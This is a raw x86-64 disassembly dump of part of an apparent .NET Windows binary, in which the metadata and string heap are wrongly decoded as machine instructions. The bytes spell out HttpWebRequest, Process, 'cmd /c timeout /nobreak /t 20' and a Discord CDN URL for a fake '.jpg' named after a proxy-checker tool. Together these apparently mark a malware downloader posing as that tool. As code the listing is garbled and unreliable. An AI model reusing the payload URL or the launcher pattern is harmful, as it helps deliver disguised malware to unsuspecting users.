   1400030dc:	6f                   	outsl  (%rsi),(%dx)
   1400030dd:	6b 65 4d 65          	imul   $0x65,0x4d(%rbp),%esp
   1400030e1:	6d                   	insl   (%dx),(%rdi)
   1400030e2:	62 65 72 00 42       	(bad)
   1400030e7:	69 6e 64 65 72 00 62 	imul   $0x62007265,0x64(%rsi),%ebp
   1400030ee:	75 66                	jne    0x140003156
   1400030f0:	66 65 72 00          	data16 gs jb 0x1400030f4
   1400030f4:	67 65 74 5f          	addr32 gs je 0x140003157
   1400030f8:	52                   	push   %rdx
   1400030f9:	65 73 6f             	gs jae 0x14000316b
   1400030fc:	75 72                	jne    0x140003170
   1400030fe:	63 65 4d             	movsxd 0x4d(%rbp),%esp
   140003101:	61                   	(bad)
   140003102:	6e                   	outsb  (%rsi),(%dx)
   140003103:	61                   	(bad)
   140003104:	67 65 72 00          	addr32 gs jb 0x140003108
   140003108:	53                   	push   %rbx
   140003109:	65 72 76             	gs jb  0x140003182
   14000310c:	69 63 65 50 6f 69 6e 	imul   $0x6e696f50,0x65(%rbx),%esp
   140003113:	74 4d                	je     0x140003162
   140003115:	61                   	(bad)
   140003116:	6e                   	outsb  (%rsi),(%dx)
   140003117:	61                   	(bad)
   140003118:	67 65 72 00          	addr32 gs jb 0x14000311c
   14000311c:	53                   	push   %rbx
   14000311d:	79 73                	jns    0x140003192
   14000311f:	74 65                	je     0x140003186
   140003121:	6d                   	insl   (%dx),(%rdi)
   140003122:	2e 43 6f             	cs rex.XB outsl (%rsi),(%dx)
   140003125:	64 65 44 6f          	fs rex.R outsl %gs:(%rsi),(%dx)
   140003129:	6d                   	insl   (%dx),(%rdi)
   14000312a:	2e 43 6f             	cs rex.XB outsl (%rsi),(%dx)
   14000312d:	6d                   	insl   (%dx),(%rdi)
   14000312e:	70 69                	jo     0x140003199
   140003130:	6c                   	insb   (%dx),(%rdi)
   140003131:	65 72 00             	gs jb  0x140003134
   140003134:	49                   	rex.WB
   140003135:	43 6f                	rex.XB outsl (%rsi),(%dx)
   140003137:	6e                   	outsb  (%rsi),(%dx)
   140003138:	74 61                	je     0x14000319b
   14000313a:	69 6e 65 72 00 2e 63 	imul   $0x632e0072,0x65(%rsi),%ebp
   140003141:	74 6f                	je     0x1400031b2
   140003143:	72 00                	jb     0x140003145
   140003145:	2e 63 63 74          	cs movsxd 0x74(%rbx),%esp
   140003149:	6f                   	outsl  (%rsi),(%dx)
   14000314a:	72 00                	jb     0x14000314c
   14000314c:	53                   	push   %rbx
   14000314d:	79 73                	jns    0x1400031c2
   14000314f:	74 65                	je     0x1400031b6
   140003151:	6d                   	insl   (%dx),(%rdi)
   140003152:	2e 44 69 61 67 6e 6f 	cs imul $0x74736f6e,0x67(%rcx),%r12d
   140003159:	73 74 
   14000315b:	69 63 73 00 47 65 74 	imul   $0x74654700,0x73(%rbx),%esp
   140003162:	4d                   	rex.WRB
   140003163:	65 74 68             	gs je  0x1400031ce
   140003166:	6f                   	outsl  (%rsi),(%dx)
   140003167:	64 73 00             	fs jae 0x14000316a
   14000316a:	53                   	push   %rbx
   14000316b:	79 73                	jns    0x1400031e0
   14000316d:	74 65                	je     0x1400031d4
   14000316f:	6d                   	insl   (%dx),(%rdi)
   140003170:	2e 52                	cs push %rdx
   140003172:	75 6e                	jne    0x1400031e2
   140003174:	74 69                	je     0x1400031df
   140003176:	6d                   	insl   (%dx),(%rdi)
   140003177:	65 2e 49 6e          	gs rex.WB outsb %gs:(%rsi),(%dx)
   14000317b:	74 65                	je     0x1400031e2
   14000317d:	72 6f                	jb     0x1400031ee
   14000317f:	70 53                	jo     0x1400031d4
   140003181:	65 72 76             	gs jb  0x1400031fa
   140003184:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%rbx),%esp
   14000318b:	73 74                	jae    0x140003201
   14000318d:	65 6d                	gs insl (%dx),(%rdi)
   14000318f:	2e 52                	cs push %rdx
   140003191:	75 6e                	jne    0x140003201
   140003193:	74 69                	je     0x1400031fe
   140003195:	6d                   	insl   (%dx),(%rdi)
   140003196:	65 2e 43 6f          	gs rex.XB outsl %gs:(%rsi),(%dx)
   14000319a:	6d                   	insl   (%dx),(%rdi)
   14000319b:	70 69                	jo     0x140003206
   14000319d:	6c                   	insb   (%dx),(%rdi)
   14000319e:	65 72 53             	gs jb  0x1400031f4
   1400031a1:	65 72 76             	gs jb  0x14000321a
   1400031a4:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%rbx),%esp
   1400031ab:	73 74                	jae    0x140003221
   1400031ad:	65 6d                	gs insl (%dx),(%rdi)
   1400031af:	2e 52                	cs push %rdx
   1400031b1:	65 73 6f             	gs jae 0x140003223
   1400031b4:	75 72                	jne    0x140003228
   1400031b6:	63 65 73             	movsxd 0x73(%rbp),%esp
   1400031b9:	00 50 73             	add    %dl,0x73(%rax)
   1400031bc:	75 6b                	jne    0x140003229
   1400031be:	70 67                	jo     0x140003227
   1400031c0:	6e                   	outsb  (%rsi),(%dx)
   1400031c1:	2e 50                	cs push %rax
   1400031c3:	72 6f                	jb     0x140003234
   1400031c5:	70 65                	jo     0x14000322c
   1400031c7:	72 74                	jb     0x14000323d
   1400031c9:	69 65 73 2e 52 65 73 	imul   $0x7365522e,0x73(%rbp),%esp
   1400031d0:	6f                   	outsl  (%rsi),(%dx)
   1400031d1:	75 72                	jne    0x140003245
   1400031d3:	63 65 73             	movsxd 0x73(%rbp),%esp
   1400031d6:	2e 72 65             	jb,pn  0x14000323e
   1400031d9:	73 6f                	jae    0x14000324a
   1400031db:	75 72                	jne    0x14000324f
   1400031dd:	63 65 73             	movsxd 0x73(%rbp),%esp
   1400031e0:	00 44 65 62          	add    %al,0x62(%rbp,%riz,2)
   1400031e4:	75 67                	jne    0x14000324d
   1400031e6:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%esi),%ebp
   1400031ed:	65 
   1400031ee:	73 00                	jae    0x1400031f0
   1400031f0:	50                   	push   %rax
   1400031f1:	73 75                	jae    0x140003268
   1400031f3:	6b 70 67 6e          	imul   $0x6e,0x67(%rax),%esi
   1400031f7:	2e 50                	cs push %rax
   1400031f9:	72 6f                	jb     0x14000326a
   1400031fb:	70 65                	jo     0x140003262
   1400031fd:	72 74                	jb     0x140003273
   1400031ff:	69 65 73 00 4e 61 6d 	imul   $0x6d614e00,0x73(%rbp),%esp
   140003206:	65 73 00             	gs jae 0x140003209
   140003209:	47                   	rex.RXB
   14000320a:	65 74 54             	gs je  0x140003261
   14000320d:	79 70                	jns    0x14000327f
   14000320f:	65 73 00             	gs jae 0x140003212
   140003212:	42 69 6e 64 69 6e 67 	rex.X imul $0x46676e69,0x64(%rsi),%ebp
   140003219:	46 
   14000321a:	6c                   	insb   (%dx),(%rdi)
   14000321b:	61                   	(bad)
   14000321c:	67 73 00             	addr32 jae 0x14000321f
   14000321f:	53                   	push   %rbx
   140003220:	65 74 74             	gs je  0x140003297
   140003223:	69 6e 67 73 00 61 72 	imul   $0x72610073,0x67(%rsi),%ebp
   14000322a:	67 73 00             	addr32 jae 0x14000322d
   14000322d:	53                   	push   %rbx
   14000322e:	79 73                	jns    0x1400032a3
   140003230:	74 65                	je     0x140003297
   140003232:	6d                   	insl   (%dx),(%rdi)
   140003233:	2e 57                	cs push %rdi
   140003235:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%rsi),%ebp
   14000323c:	46 6f                	rex.RX outsl (%rsi),(%dx)
   14000323e:	72 6d                	jb     0x1400032ad
   140003240:	73 00                	jae    0x140003242
   140003242:	50                   	push   %rax
   140003243:	72 6f                	jb     0x1400032b4
   140003245:	63 65 73             	movsxd 0x73(%rbp),%esp
   140003248:	73 00                	jae    0x14000324a
   14000324a:	73 65                	jae    0x1400032b1
   14000324c:	74 5f                	je     0x1400032ad
   14000324e:	41 72 67             	rex.B jb 0x1400032b8
   140003251:	75 6d                	jne    0x1400032c0
   140003253:	65 6e                	outsb  %gs:(%rsi),(%dx)
   140003255:	74 73                	je     0x1400032ca
   140003257:	00 63 6f             	add    %ah,0x6f(%rbx)
   14000325a:	6d                   	insl   (%dx),(%rdi)
   14000325b:	70 6f                	jo     0x1400032cc
   14000325d:	6e                   	outsb  (%rsi),(%dx)
   14000325e:	65 6e                	outsb  %gs:(%rsi),(%dx)
   140003260:	74 73                	je     0x1400032d5
   140003262:	00 4f 62             	add    %cl,0x62(%rdi)
   140003265:	6a 65                	push   $0x65
   140003267:	63 74 00 53          	movsxd 0x53(%rax,%rax,1),%esi
   14000326b:	79 73                	jns    0x1400032e0
   14000326d:	74 65                	je     0x1400032d4
   14000326f:	6d                   	insl   (%dx),(%rdi)
   140003270:	2e 4e                	cs rex.WRX
   140003272:	65 74 00             	gs je  0x140003275
   140003275:	67 65 74 5f          	addr32 gs je 0x1400032d8
   140003279:	44                   	rex.R
   14000327a:	65 66 61             	gs data16 (bad)
   14000327d:	75 6c                	jne    0x1400032eb
   14000327f:	74 00                	je     0x140003281
   140003281:	46 69 72 73 74 4f 72 	rex.RX imul $0x44724f74,0x73(%rdx),%r14d
   140003288:	44 
   140003289:	65 66 61             	gs data16 (bad)
   14000328c:	75 6c                	jne    0x1400032fa
   14000328e:	74 00                	je     0x140003290
   140003290:	49 6e                	rex.WB outsb (%rsi),(%dx)
   140003292:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%rcx,%rbp,2),%esi
   140003299:	65 
   14000329a:	43 6f                	rex.XB outsl (%rsi),(%dx)
   14000329c:	6d                   	insl   (%dx),(%rdi)
   14000329d:	70 6f                	jo     0x14000330e
   14000329f:	6e                   	outsb  (%rsi),(%dx)
   1400032a0:	65 6e                	outsb  %gs:(%rsi),(%dx)
   1400032a2:	74 00                	je     0x1400032a4
   1400032a4:	53                   	push   %rbx
   1400032a5:	74 61                	je     0x140003308
   1400032a7:	72 74                	jb     0x14000331d
   1400032a9:	00 48 74             	add    %cl,0x74(%rax)
   1400032ac:	74 70                	je     0x14000331e
   1400032ae:	57                   	push   %rdi
   1400032af:	65 62 52 65 71 75    	(bad)
   1400032b5:	65 73 74             	gs jae 0x14000332c
   1400032b8:	00 67 65             	add    %ah,0x65(%rdi)
   1400032bb:	74 5f                	je     0x14000331c
   1400032bd:	54                   	push   %rsp
   1400032be:	65 78 74             	gs js  0x140003335
   1400032c1:	00 73 65             	add    %dh,0x65(%rbx)
   1400032c4:	74 5f                	je     0x140003325
   1400032c6:	54                   	push   %rsp
   1400032c7:	65 78 74             	gs js  0x14000333e
   1400032ca:	00 42 6f             	add    %al,0x6f(%rdx)
   1400032cd:	78 00                	js     0x1400032cf
   1400032cf:	54                   	push   %rsp
   1400032d0:	6f                   	outsl  (%rsi),(%dx)
   1400032d1:	41 72 72             	rex.B jb 0x140003346
   1400032d4:	61                   	(bad)
   1400032d5:	79 00                	jns    0x1400032d7
   1400032d7:	67 65 74 5f          	addr32 gs je 0x14000333a
   1400032db:	41 73 73             	rex.B jae 0x140003351
   1400032de:	65 6d                	gs insl (%dx),(%rdi)
   1400032e0:	62 6c 79 00 6f       	(bad)
   1400032e5:	70 5f                	jo     0x140003346
   1400032e7:	45 71 75             	rex.RB jno 0x14000335f
   1400032ea:	61                   	(bad)
   1400032eb:	6c                   	insb   (%dx),(%rdi)
   1400032ec:	69 74 79 00 00 0b 46 	imul   $0x460b00,0x0(%rcx,%rdi,2),%esi
   1400032f3:	00 
   1400032f4:	6f                   	outsl  (%rsi),(%dx)
   1400032f5:	00 72 00             	add    %dh,0x0(%rdx)
   1400032f8:	6d                   	insl   (%dx),(%rdi)
   1400032f9:	00 31                	add    %dh,(%rcx)
   1400032fb:	00 00                	add    %al,(%rax)
   1400032fd:	07                   	(bad)
   1400032fe:	63 00                	movsxd (%rax),%eax
   140003300:	6d                   	insl   (%dx),(%rdi)
   140003301:	00 64 00 00          	add    %ah,0x0(%rax,%rax,1)
   140003305:	33 2f                	xor    (%rdi),%ebp
   140003307:	00 63 00             	add    %ah,0x0(%rbx)
   14000330a:	20 00                	and    %al,(%rax)
   14000330c:	74 00                	je     0x14000330e
   14000330e:	69 00 6d 00 65 00    	imul   $0x65006d,(%rax),%eax
   140003314:	6f                   	outsl  (%rsi),(%dx)
   140003315:	00 75 00             	add    %dh,0x0(%rbp)
   140003318:	74 00                	je     0x14000331a
   14000331a:	20 00                	and    %al,(%rax)
   14000331c:	2f                   	(bad)
   14000331d:	00 6e 00             	add    %ch,0x0(%rsi)
   140003320:	6f                   	outsl  (%rsi),(%dx)
   140003321:	00 62 00             	add    %ah,0x0(%rdx)
   140003324:	72 00                	jb     0x140003326
   140003326:	65 00 61 00          	add    %ah,%gs:0x0(%rcx)
   14000332a:	6b 00 20             	imul   $0x20,(%rax),%eax
   14000332d:	00 2f                	add    %ch,(%rdi)
   14000332f:	00 74 00 20          	add    %dh,0x20(%rax,%rax,1)
   140003333:	00 32                	add    %dh,(%rdx)
   140003335:	00 30                	add    %dh,(%rax)
   140003337:	00 00                	add    %al,(%rax)
   140003339:	81 01 68 00 74 00    	addl   $0x740068,(%rcx)
   14000333f:	74 00                	je     0x140003341
   140003341:	70 00                	jo     0x140003343
   140003343:	73 00                	jae    0x140003345
   140003345:	3a 00                	cmp    (%rax),%al
   140003347:	2f                   	(bad)
   140003348:	00 2f                	add    %ch,(%rdi)
   14000334a:	00 63 00             	add    %ah,0x0(%rbx)
   14000334d:	64 00 6e 00          	add    %ch,%fs:0x0(%rsi)
   140003351:	2e 00 64 00 69       	cs add %ah,0x69(%rax,%rax,1)
   140003356:	00 73 00             	add    %dh,0x0(%rbx)
   140003359:	63 00                	movsxd (%rax),%eax
   14000335b:	6f                   	outsl  (%rsi),(%dx)
   14000335c:	00 72 00             	add    %dh,0x0(%rdx)
   14000335f:	64 00 61 00          	add    %ah,%fs:0x0(%rcx)
   140003363:	70 00                	jo     0x140003365
   140003365:	70 00                	jo     0x140003367
   140003367:	2e 00 63 00          	cs add %ah,0x0(%rbx)
   14000336b:	6f                   	outsl  (%rsi),(%dx)
   14000336c:	00 6d 00             	add    %ch,0x0(%rbp)
   14000336f:	2f                   	(bad)
   140003370:	00 61 00             	add    %ah,0x0(%rcx)
   140003373:	74 00                	je     0x140003375
   140003375:	74 00                	je     0x140003377
   140003377:	61                   	(bad)
   140003378:	00 63 00             	add    %ah,0x0(%rbx)
   14000337b:	68 00 6d 00 65       	push   $0x65006d00
   140003380:	00 6e 00             	add    %ch,0x0(%rsi)
   140003383:	74 00                	je     0x140003385
   140003385:	73 00                	jae    0x140003387
   140003387:	2f                   	(bad)
   140003388:	00 39                	add    %bh,(%rcx)
   14000338a:	00 35 00 30 00 38    	add    %dh,0x38003000(%rip)        # 0x178006390
   140003390:	00 30                	add    %dh,(%rax)
   140003392:	00 33                	add    %dh,(%rbx)
   140003394:	00 36                	add    %dh,(%rsi)
   140003396:	00 35 00 32 00 32    	add    %dh,0x32003200(%rip)        # 0x17200659c
   14000339c:	00 32                	add    %dh,(%rdx)
   14000339e:	00 30                	add    %dh,(%rax)
   1400033a0:	00 36                	add    %dh,(%rsi)
   1400033a2:	00 39                	add    %bh,(%rcx)
   1400033a4:	00 30                	add    %dh,(%rax)
   1400033a6:	00 34 00             	add    %dh,(%rax,%rax,1)
   1400033a9:	35 00 35 00 2f       	xor    $0x2f003500,%eax
   1400033ae:	00 39                	add    %bh,(%rcx)
   1400033b0:	00 38                	add    %bh,(%rax)
   1400033b2:	00 30                	add    %dh,(%rax)
   1400033b4:	00 31                	add    %dh,(%rcx)
   1400033b6:	00 36                	add    %dh,(%rsi)
   1400033b8:	00 39                	add    %bh,(%rcx)
   1400033ba:	00 32                	add    %dh,(%rdx)
   1400033bc:	00 39                	add    %bh,(%rcx)
   1400033be:	00 39                	add    %bh,(%rcx)
   1400033c0:	00 30                	add    %dh,(%rax)
   1400033c2:	00 37                	add    %dh,(%rdi)
   1400033c4:	00 37                	add    %dh,(%rdi)
   1400033c6:	00 35 00 30 00 35    	add    %dh,0x35003000(%rip)        # 0x1750063cc
   1400033cc:	00 30                	add    %dh,(%rax)
   1400033ce:	00 37                	add    %dh,(%rdi)
   1400033d0:	00 34 00             	add    %dh,(%rax,%rax,1)
   1400033d3:	2f                   	(bad)
   1400033d4:	00 75 00             	add    %dh,0x0(%rbp)
   1400033d7:	6e                   	outsb  (%rsi),(%dx)
   1400033d8:	00 66 00             	add    %ah,0x0(%rsi)
   1400033db:	78 00                	js     0x1400033dd
   1400033dd:	2d 00 70 00 72       	sub    $0x72007000,%eax
   1400033e2:	00 6f 00             	add    %ch,0x0(%rdi)
   1400033e5:	78 00                	js     0x1400033e7
   1400033e7:	79 00                	jns    0x1400033e9
   1400033e9:	2d 00 63 00 68       	sub    $0x68006300,%eax
   1400033ee:	00 65 00             	add    %ah,0x0(%rbp)
   1400033f1:	63 00                	movsxd (%rax),%eax
   1400033f3:	6b 00 65             	imul   $0x65,(%rax),%eax
   1400033f6:	00 72 00             	add    %dh,0x0(%rdx)
   1400033f9:	2d 00 76 00 31       	sub    $0x31007600,%eax
   1400033fe:	00 2e                	add    %ch,(%rsi)
   140003400:	00 36                	add    %dh,(%rsi)
   140003402:	00 2e                	add    %ch,(%rsi)
   140003404:	00 31                	add    %dh,(%rcx)
   140003406:	00 2d 00 77 00 69    	add    %ch,0x69007700(%rip)        # 0x1a900ab0c
   14000340c:	00 6e 00             	add    %ch,0x0(%rsi)
   14000340f:	2d 00 70 00 6f       	sub    $0x6f007000,%eax
   140003414:	00 72 00             	add    %dh,0x0(%rdx)
   140003417:	74 00                	je     0x140003419
   140003419:	61                   	(bad)
   14000341a:	00 62 00             	add    %ah,0x0(%rdx)
   14000341d:	6c                   	insb   (%dx),(%rdi)
   14000341e:	00 65 00             	add    %ah,0x0(%rbp)
   140003421:	5f                   	pop    %rdi
   140003422:	00 58 00             	add    %bl,0x0(%rax)
   140003425:	77 00                	ja     0x140003427
   140003427:	79 00                	jns    0x140003429
   140003429:	76 00                	jbe    0x14000342b
   14000342b:	72 00                	jb     0x14000342d
   14000342d:	75 00                	jne    0x14000342f
   14000342f:	61                   	(bad)
   140003430:	00 73 00             	add    %dh,0x0(%rbx)
   140003433:	2e 00 6a 00          	cs add %ch,0x0(%rdx)
   140003437:	70 00                	jo     0x140003439
   140003439:	67 00 01             	add    %al,(%ecx)
   14000343c:	2f                   	(bad)
   14000343d:	51                   	push   %rcx
   14000343e:	00 6d 00             	add    %ch,0x0(%rbp)
   140003441:	6d                   	insl   (%dx),(%rdi)
   140003442:	00 71 00             	add    %dh,0x0(%rcx)
   140003445:	72 00                	jb     0x140003447
   140003447:	6d                   	insl   (%dx),(%rdi)
   140003448:	00 73 00             	add    %dh,0x0(%rbx)
   14000344b:	72 00                	jb     0x14000344d
   14000344d:	76 00                	jbe    0x14000344f
   14000344f:	6f                   	outsl  (%rsi),(%dx)
   140003450:	00 71 00             	add    %dh,0x0(%rcx)
   140003453:	77 00                	ja     0x140003455
   140003455:	6c                   	insb   (%dx),(%rdi)
   140003456:	00 75 00             	add    %dh,0x0(%rbp)
   140003459:	74 00                	je     0x14000345b
   14000345b:	2e 00 59 00          	cs add %bl,0x0(%rcx)
   14000345f:	77 00                	ja     0x140003461
   140003461:	6c                   	insb   (%dx),(%rdi)
   140003462:	00 61 00             	add    %ah,0x0(%rcx)
   140003465:	66 00 76 00          	data16 add %dh,0x0(%rsi)
   140003469:	65 00 00             	add    %al,%gs:(%rax)
   14000346c:	25 58 00 62 00       	and    $0x620058,%eax
   140003471:	6e                   	outsb  (%rsi),(%dx)
   140003472:	00 61 00             	add    %ah,0x0(%rcx)
   140003475:	68 00 67 00 6d       	push   $0x6d006700
   14000347a:	00 6e 00             	add    %ch,0x0(%rsi)
   14000347d:	77 00                	ja     0x14000347f
   14000347f:	6c                   	insb   (%dx),(%rdi)
   140003480:	00 79 00             	add    %bh,0x0(%rcx)
   140003483:	63 00                	movsxd (%rax),%eax
   140003485:	6f                   	outsl  (%rsi),(%dx)
   140003486:	00 69 00             	add    %ch,0x0(%rcx)
   140003489:	79 00                	jns    0x14000348b
   14000348b:	65 00 68 00          	add    %ch,%gs:0x0(%rax)
   14000348f:	6b 00 00             	imul   $0x0,(%rax),%eax
   140003492:	39 50 00             	cmp    %edx,0x0(%rax)
   140003495:	73 00                	jae    0x140003497
   140003497:	75 00                	jne    0x140003499
   140003499:	6b 00 70             	imul   $0x70,(%rax),%eax
   14000349c:	00 67 00             	add    %ah,0x0(%rdi)
   14000349f:	6e                   	outsb  (%rsi),(%dx)
   1400034a0:	00 2e                	add    %ch,(%rsi)
   1400034a2:	00 50 00             	add    %dl,0x0(%rax)
   1400034a5:	72 00                	jb     0x1400034a7
   1400034a7:	6f                   	outsl  (%rsi),(%dx)
   1400034a8:	00 70 00             	add    %dh,0x0(%rax)
   1400034ab:	65 00 72 00          	add    %dh,%gs:0x0(%rdx)
   1400034af:	74 00                	je     0x1400034b1
   1400034b1:	69 00 65 00 73 00    	imul   $0x730065,(%rax),%eax
   1400034b7:	2e 00 52 00          	cs add %dl,0x0(%rdx)
   1400034bb:	65 00 73 00          	add    %dh,%gs:0x0(%rbx)
   1400034bf:	6f                   	outsl  (%rsi),(%dx)
   1400034c0:	00 75 00             	add    %dh,0x0(%rbp)
   1400034c3:	72 00                	jb     0x1400034c5
   1400034c5:	63 00                	movsxd (%rax),%eax
   1400034c7:	65 00 73 00          	add    %dh,%gs:0x0(%rbx)
   1400034cb:	00 44 4a 80          	add    %al,-0x80(%rdx,%rcx,2)
   1400034cf:	bd 28 7a 9d 41       	mov    $0x419d7a28,%ebp
   1400034d4:	be 6f ad 25 07       	mov    $0x725ad6f,%esi
   1400034d9:	ab                   	stos   %eax,(%rdi)
   1400034da:	e4 cd                	in     $0xcd,%al
   1400034dc:	00 04 20             	add    %al,(%rax,%riz,1)
   1400034df:	01 01                	add    %eax,(%rcx)
   1400034e1:	08 03                	or     %al,(%rbx)
   1400034e3:	20 00                	and    %al,(%rax)
   1400034e5:	01 05 20 01 01 11    	add    %eax,0x11010120(%rip)        # 0x15101360b
   1400034eb:	11 04 20             	adc    %eax,(%rax,%riz,1)
   1400034ee:	01 01                	add    %eax,(%rcx)
   1400034f0:	0e                   	(bad)
   1400034f1:	04 20                	add    $0x20,%al
   1400034f3:	01 01                	add    %eax,(%rcx)
   1400034f5:	02 05 20 02 01 0e    	add    0xe010220(%rip),%al        # 0x14e01371b
   1400034fb:	0e                   	(bad)
   1400034fc:	06                   	(bad)
   1400034fd:	20 01                	and    %al,(%rcx)
   1400034ff:	01 11                	add    %edx,(%rcx)
   140003501:	80 85 03 07 01 02 06 	addb   $0x6,0x2010703(%rbp)
   140003508:	20 01                	and    %al,(%rcx)
   14000350a:	01 11                	add    %edx,(%rcx)
   14000350c:	80 9d 05 20 02 01 08 	sbbb   $0x8,0x1022005(%rbp)
   140003513:	08 06                	or     %al,(%rsi)
   140003515:	20 01                	and    %al,(%rcx)
   140003517:	01 11                	add    %edx,(%rcx)
   140003519:	80 a1 09 07 04 1d 05 	andb   $0x5,0x1d040709(%rcx)
   140003520:	12 51 02             	adc    0x2(%rcx),%dl
   140003523:	1d 05 05 20 00       	sbb    $0x200505,%eax
   140003528:	12 80 a9 06 20 01    	adc    0x12006a9(%rax),%al
   14000352e:	01 11                	add    %edx,(%rcx)
   140003530:	80 ad 03 20 00 02 08 	subb   $0x8,0x2002003(%rbp)
   140003537:	00 03                	add    %al,(%rbx)
   140003539:	01 12                	add    %edx,(%rdx)
   14000353b:	80 b1 08 08 08 07 03 	xorb   $0x3,0x7080808(%rcx)
   140003542:	12 55 1d             	adc    0x1d(%rbp),%dl
   140003545:	05 1d 05 05 20       	add    $0x2005051d,%eax
   14000354a:	01 01                	add    %eax,(%rcx)
   14000354c:	12 59 04             	adc    0x4(%rcx),%bl
   14000354f:	20 00                	and    %al,(%rax)
   140003551:	1d 05 0a 07 04       	sbb    $0x4070a05,%eax
   140003556:	12 5d 12             	adc    0x12(%rbp),%bl
   140003559:	61                   	(bad)
   14000355a:	12 59 12             	adc    0x12(%rcx),%bl
   14000355d:	59                   	pop    %rcx
   14000355e:	06                   	(bad)
   14000355f:	00 01                	add    %al,(%rcx)
   140003561:	01 11                	add    %edx,(%rcx)
   140003563:	80 b9 06 00 01 12 80 	cmpb   $0x80,0x12010006(%rcx)
   14000356a:	bd 0e 05 20 00       	mov    $0x20050e,%ebp
   14000356f:	12 80 c1 04 20 00    	adc    0x2004c1(%rax),%al
   140003575:	12 59 04             	adc    0x4(%rcx),%bl
   140003578:	07                   	(bad)
   140003579:	01 12                	add    %edx,(%rdx)
   14000357b:	65 06                	gs (bad)
   14000357d:	00 01                	add    %al,(%rcx)
   14000357f:	12 65 1d             	adc    0x1d(%rbp),%ah
   140003582:	05 0b 07 06 12       	add    $0x1206070b,%eax
   140003587:	65 02 12             	add    %gs:(%rdx),%dl
   14000358a:	69 02 12 6d 02 07    	imul   $0x7026d12,(%rdx),%eax
   140003590:	00 02                	add    %al,(%rdx)
   140003592:	02 12                	add    (%rdx),%dl
   140003594:	65 12 65 05          	adc    %gs:0x5(%rbp),%ah
   140003598:	20 00                	and    %al,(%rax)
   14000359a:	1d 12 69 08 15       	sbb    $0x15086912,%eax
   14000359f:	12 80 c9 02 12 69    	adc    0x691202c9(%rax),%al
   1400035a5:	02 05 20 02 01 1c    	add    0x1c010220(%rip),%al        # 0x15c0137cb
   1400035ab:	18 14 10             	sbb    %dl,(%rax,%rdx,1)
   1400035ae:	01 02                	add    %eax,(%rdx)
   1400035b0:	1e                   	(bad)
   1400035b1:	00 15 12 80 d1 01    	add    %dl,0x1d18012(%rip)        # 0x141d1b5c9
   1400035b7:	1e                   	(bad)
   1400035b8:	00 15 12 80 c9 02    	add    %dl,0x2c98012(%rip)        # 0x142c9b5d0
   1400035be:	1e                   	(bad)
   1400035bf:	00 02                	add    %al,(%rdx)
   1400035c1:	04 0a                	add    $0xa,%al
   1400035c3:	01 12                	add    %edx,(%rdx)
   1400035c5:	69 07 00 02 02 12    	imul   $0x12020200,(%rdi),%eax
   1400035cb:	69 12 69 05 20 00    	imul   $0x200569,(%rdx),%edx
   1400035d1:	1d 12 6d 08 15       	sbb    $0x15086d12,%eax
   1400035d6:	12 80 c9 02 12 6d    	adc    0x6d1202c9(%rax),%al
   1400035dc:	02 04 0a             	add    (%rdx,%rcx,1),%al
   1400035df:	01 12                	add    %edx,(%rdx)
   1400035e1:	6d                   	insl   (%dx),(%rdi)
   1400035e2:	07                   	(bad)
   1400035e3:	00 02                	add    %al,(%rdx)
   1400035e5:	02 12                	add    (%rdx),%dl
   1400035e7:	6d                   	insl   (%dx),(%rdi)
   1400035e8:	12 6d 03             	adc    0x3(%rbp),%ch
   1400035eb:	20 00                	and    %al,(%rax)
   1400035ed:	0e                   	(bad)
   1400035ee:	0d 20 05 1c 0e       	or     $0xe1c0520,%eax
   1400035f3:	11 80 d9 12 80 dd    	adc    %eax,-0x227fed27(%rax)
   1400035f9:	1c 1d                	sbb    $0x1d,%al
   1400035fb:	1c 05                	sbb    $0x5,%al
   1400035fd:	00 02                	add    %al,(%rdx)
   1400035ff:	02 0e                	add    (%rsi),%cl
   140003601:	0e                   	(bad)
   140003602:	07                   	(bad)
   140003603:	07                   	(bad)
   140003604:	03 02                	add    (%rdx),%eax
   140003606:	12 7d 12             	adc    0x12(%rbp),%bh
   140003609:	7d 07                	jge    0x140003612
   14000360b:	00 01                	add    %al,(%rcx)
   14000360d:	12 69 11             	adc    0x11(%rcx),%ch
   140003610:	80 e5 04             	and    $0x4,%ch
   140003613:	20 00                	and    %al,(%rax)
   140003615:	12 65 06             	adc    0x6(%rbp),%ah
   140003618:	20 02                	and    %al,(%rdx)
   14000361a:	01 0e                	add    %ecx,(%rsi)
   14000361c:	12 65 05             	adc    0x5(%rbp),%ah
   14000361f:	07                   	(bad)
   140003620:	01 12                	add    %edx,(%rdx)
   140003622:	80 81 04 07 01 12 18 	addb   $0x18,0x12010704(%rcx)
   140003629:	08 00                	or     %al,(%rax)
   14000362b:	01 12                	add    %edx,(%rdx)
   14000362d:	80 e9 12             	sub    $0x12,%cl
   140003630:	80 e9 08             	sub    $0x8,%cl
   140003633:	b7 7a                	mov    $0x7a,%bh
   140003635:	5c                   	pop    %rsp
   140003636:	56                   	push   %rsi
   140003637:	19 34 e0             	sbb    %esi,(%rax,%riz,8)
   14000363a:	89 08                	mov    %ecx,(%rax)
   14000363c:	b0 3f                	mov    $0x3f,%al
   14000363e:	5f                   	pop    %rdi
   14000363f:	7f 11                	jg     0x140003652
   140003641:	d5 0a 3a 03          	{rex2 0xa} cmp (%rbx),%al
   140003645:	06                   	(bad)
   140003646:	12 4d 03             	adc    0x3(%rbp),%cl
   140003649:	06                   	(bad)
   14000364a:	12 7d 04             	adc    0x4(%rbp),%bh
   14000364d:	06                   	(bad)
   14000364e:	12 80 81 03 06 12    	adc    0x12060381(%rax),%al
   140003654:	18 05 00 01 01 1d    	sbb    %al,0x1d010100(%rip)        # 0x15d01375a
   14000365a:	0e                   	(bad)
   14000365b:	06                   	(bad)
   14000365c:	20 01                	and    %al,(%rcx)
   14000365e:	1d 05 1d 05 05       	sbb    $0x5051d05,%eax
   140003663:	20 01                	and    %al,(%rcx)
   140003665:	1d 05 0e 05 20       	sbb    $0x20050e05,%eax
   14000366a:	01 12                	add    %edx,(%rdx)
   14000366c:	59                   	pop    %rcx
   14000366d:	0e                   	(bad)
   14000366e:	05 20 01 02 12       	add    $0x12020120,%eax
   140003673:	69 05 20 01 02 12 6d 	imul   $0x46d,0x12020120(%rip),%eax        # 0x15202379d
   14000367a:	04 00 00 
   14000367d:	12 7d 05             	adc    0x5(%rbp),%bh
   140003680:	00 00                	add    %al,(%rax)
